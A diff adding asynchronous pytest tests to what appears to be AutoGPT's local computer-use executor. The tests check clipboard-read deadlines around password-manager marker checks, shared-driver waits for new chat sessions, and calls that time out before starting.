+    """The check for a password manager's marker (xclip or wl-paste, up to
+    three seconds) ran before the driver's read, which still got the call's
+    whole timeout, so the read could start after the deadline."""
+    import time
+
+    from autogpt_local_executor import handlers
+
+    def slow_look(_timeout: float | None = None) -> concealed.ClipboardState:
+        time.sleep(2)
+        return concealed.ClipboardState(None, 7)
+
+    monkeypatch.setattr(handlers, "clipboard_state", slow_look)
+    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
+    (tmp_path / "clipboard.txt").write_text("a copied paragraph")
+
+    response = await handler.handle(_call("clipboard_read", timeout_seconds=1))
+
+    assert isinstance(response, ErrorMessage)
+    assert response.payload.code == ErrorCode.COMMAND_TIMEOUT
+    assert response.payload.details["started"] is False
+    assert [r for r in _records(fake_log, "call") if r["tool"] == "clipboard_read"] == []
+
+
+async def test_each_look_at_a_foreign_clipboard_gets_only_the_time_left(
+    make_handler, tmp_path, monkeypatch
+) -> None:
+    """Each check for a password manager's marker could take its own three
+    seconds (xclip, wl-paste) whatever the call's deadline, holding the
+    computer's turn, which every chat's calls share, past it."""
+    from autogpt_local_executor import handlers
+
+    given: list[float | None] = []
+
+    def look(timeout: float | None = None) -> concealed.ClipboardState:
+        given.append(timeout)
+        return concealed.ClipboardState(None, 7)
+
+    monkeypatch.setattr(handlers, "clipboard_state", look)
+    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
+    (tmp_path / "clipboard.txt").write_text("a copied paragraph")
+
+    response = await handler.handle(_call("clipboard_read", timeout_seconds=2))
+
+    assert isinstance(response, ComputerToolResultMessage)
+    assert len(given) == 2
+    assert all(timeout is not None and 0 < timeout <= 2 for timeout in given)
+
+
+async def test_a_second_clipboard_read_never_starts_past_the_deadline(
+    make_handler, tmp_path, fake_log, monkeypatch
+) -> None:
+    """On Linux the shim reads twice. A deadline that passed after the first
+    read still started the second, given a millisecond, so it overran and
+    the bridge stopped the driver every chat shares."""
+    from autogpt_local_executor import handlers
+
+    monkeypatch.setattr(
+        handlers, "clipboard_state", lambda _timeout=None: concealed.ClipboardState(None)
+    )
+    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
+    (tmp_path / "clipboard.txt").write_text("a copied paragraph")
+    loop = asyncio.get_running_loop()
+    deadlines: list[float] = []
+    real_deadline = handlers.ComputerUseHandler.call_deadline
+
+    def recorded_deadline(msg, received_at=None):
+        deadlines.append(real_deadline(msg, received_at))
+        return deadlines[-1]
+
+    monkeypatch.setattr(
+        handlers.ComputerUseHandler, "call_deadline", staticmethod(recorded_deadline)
+    )
+    real_call = handler.call_driver
+    reads = 0
+
+    async def first_read_runs_to_the_deadline(tool, arguments, **kwargs):
+        nonlocal reads
+        reads += 1
+        result = await real_call(tool, arguments, **kwargs)
+        if tool == "clipboard_read" and reads == 1:
+            await asyncio.sleep(max(deadlines[0] - loop.time(), 0) + 0.2)
+        return result
+
+    monkeypatch.setattr(handler, "call_driver", first_read_runs_to_the_deadline)
+    response = await handler.handle(_call("clipboard_read", timeout_seconds=2))
+
+    assert isinstance(response, ErrorMessage)
+    assert response.payload.code == ErrorCode.COMMAND_TIMEOUT
+    assert response.payload.details["started"] is True
+    assert "a copied paragraph" not in response.model_dump_json()
+    assert len([r for r in _records(fake_log, "call") if r["tool"] == "clipboard_read"]) == 1
+    assert "stopped cua-driver" not in response.payload.message
 
 
 def test_marker_in_finds_each_platforms_marker() -> None:
@@ -1349,6 +2132,67 @@ async def test_text_one_chat_wrote_is_readable_from_another(make_handler) -> Non
 
 
 # ── Daemon ───────────────────────────────────────────────────────────────
+
+
+async def test_a_child_session_waits_only_briefly_for_a_busy_shared_driver(
+    tmp_path, fake_log, monkeypatch
+) -> None:
+    """The platform waits a few seconds (eight) for a chat's session to
+    connect, then undoes the chat. A new chat's permission check waited up
+    to 30 s for the shared driver, which another chat's call can hold far
+    longer, and its HELLO up to 10 s more for the screen size."""
+    from autogpt_local_executor import handlers, platform_info
+
+    monkeypatch.setattr(platform_info, "detect_platform", lambda: "darwin")
+    monkeypatch.setattr(handlers, "CHILD_DRIVER_WAIT_SECONDS", 0.2, raising=False)
+    parent = _daemon(tmp_path, session_id=None)
+    child = _daemon(tmp_path, session_id="child-1")
+    parent._computer_handler.share_with(child._computer_handler)
+    driver = parent._computer_handler.driver
+    await driver.snapshot()
+    await driver._turn.acquire()  # another chat's call, running
+    starting = asyncio.ensure_future(
+        asyncio.gather(child._preflight_computer_use(), child._computer_handler.screen_size())
+    )
+    try:
+        done, _ = await asyncio.wait({starting}, timeout=5)
+        assert starting in done
+        assert starting.result() == [None, None]
+    finally:
+        starting.cancel()
+        driver._turn.release()
+        await parent._computer_handler.close()
+
+
+async def test_a_child_hello_waits_only_briefly_for_a_driver_starting_again(
+    tmp_path, fake_log, linux_with_display, monkeypatch
+) -> None:
+    """A new chat's HELLO waited, without a deadline, for the shared driver
+    to start again after another chat's call overran it, which can take a
+    minute; the platform undoes a chat whose session isn't up in about
+    eight seconds. It now goes on with the tools the driver last offered."""
+    from autogpt_local_executor import handlers
+
+    monkeypatch.setattr(handlers, "CHILD_DRIVER_WAIT_SECONDS", 0.2, raising=False)
+    parent = _daemon(tmp_path, session_id=None)
+    child = _daemon(tmp_path, session_id="child-1")
+    parent._computer_handler.share_with(child._computer_handler)
+    driver = parent._computer_handler.driver
+    await driver.snapshot()
+    await driver._stop_client()  # stopped to end another chat's call
+    await driver._lock.acquire()  # and starting again, slowly
+    building = asyncio.ensure_future(child._build_hello())
+    try:
+        done, _ = await asyncio.wait({building}, timeout=10)
+        assert building in done
+        hello = building.result()
+    finally:
+        building.cancel()
+        driver._lock.release()
+        await parent._computer_handler.close()
+
+    assert "computer_use" in hello.payload.capabilities
+    assert hello.payload.computer_use_tools == sorted(catalog.offered_tools(enable_clipboard=False))
 
 
 def _daemon(tmp_path: Path, **overrides: Any):
@@ -1441,6 +2285,79 @@ async def test_computer_tool_calls_need_the_granted_capability(tmp_path, fake_lo
     assert isinstance(response, ErrorMessage)
     assert response.payload.code == ErrorCode.CAPABILITY_NOT_GRANTED
     assert _records(fake_log, "call") == []
+
+
+async def test_a_call_queued_behind_another_chats_call_gives_up_unstarted(
+    tmp_path, fake_log
+) -> None:
+    """The daemon waited for the computer with no bound, so a call queued
+    behind another chat's started whenever its turn came."""
+    daemon = _daemon(tmp_path)
+    daemon._granted_capabilities = frozenset({"files", "computer_use"})
+    daemon._semaphore = asyncio.Semaphore(4)
+    sent: list[Any] = []
+
+    async def send_frame(_ws: Any, frame: Any) -> bool:
+        sent.append(frame)
+        return True
+
+    daemon._send_frame = send_frame  # type: ignore[method-assign]
+    try:
+        # Another chat's call holds the computer for longer than this one may wait.
+        async with daemon._computer_use_lock:
+            await asyncio.wait_for(
+                daemon._dispatch(None, _call("click", {"pid": 1}, timeout_seconds=1)), 30
+            )
+    finally:
+        await daemon._computer_handler.close()
+
+    [frame] = sent
+    assert isinstance(frame, ErrorMessage)
+    assert frame.payload.code == ErrorCode.COMMAND_TIMEOUT
+    assert frame.payload.details["started"] is False
+    assert _records(fake_log, "call") == []
+
+
+async def test_a_child_session_starts_while_another_chats_call_holds_the_driver(
+    tmp_path, fake_log, monkeypatch
+) -> None:
+    """On macOS every session checked the grants through the shared driver,
+    within 30 s. A call from another chat that held the driver longer failed
+    the new session's preflight, so it ended after activation had reported it
+    ready."""
+    from autogpt_local_executor import daemon as daemon_module
+    from autogpt_local_executor import platform_info
+
+    monkeypatch.setattr(platform_info, "detect_platform", lambda: "darwin")
+    monkeypatch.setattr(daemon_module, "PERMISSION_CHECK_SECONDS", 0.3)
+    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "1.5")
+    parent = _daemon(tmp_path, session_id=None)
+    child = _daemon(tmp_path, session_id="child-1")
+    parent._computer_handler.share_with(child._computer_handler)
+    driver = parent._computer_handler.driver
+    try:
+        slow = asyncio.create_task(driver.call_tool("drag", {"pid": -2}, timeout=30))
+        for _ in range(250):
+            if _records(fake_log, "call"):
+                break
+            await asyncio.sleep(0.02)
+
+        await child._preflight_computer_use()  # doesn't raise
+        result = await slow
+        # The parent, which owns the driver, still fails a check that can't run.
+        busy = asyncio.create_task(driver.call_tool("drag", {"pid": -2}, timeout=30))
+        for _ in range(250):
+            if len(_records(fake_log, "call")) >= 2:
+                break
+            await asyncio.sleep(0.02)
+        with pytest.raises(daemon_module.DaemonPreflightError):
+            await parent._preflight_computer_use()
+        await busy
+    finally:
+        await parent._computer_handler.close()
+
+    assert result["content"] == [{"type": "text", "text": "slow"}]
+    assert [r["tool"] for r in _records(fake_log, "call")] == ["drag", "drag"]
 
 
 async def test_the_tool_list_does_not_wait_for_a_running_action(tmp_path, fake_log) -> None:
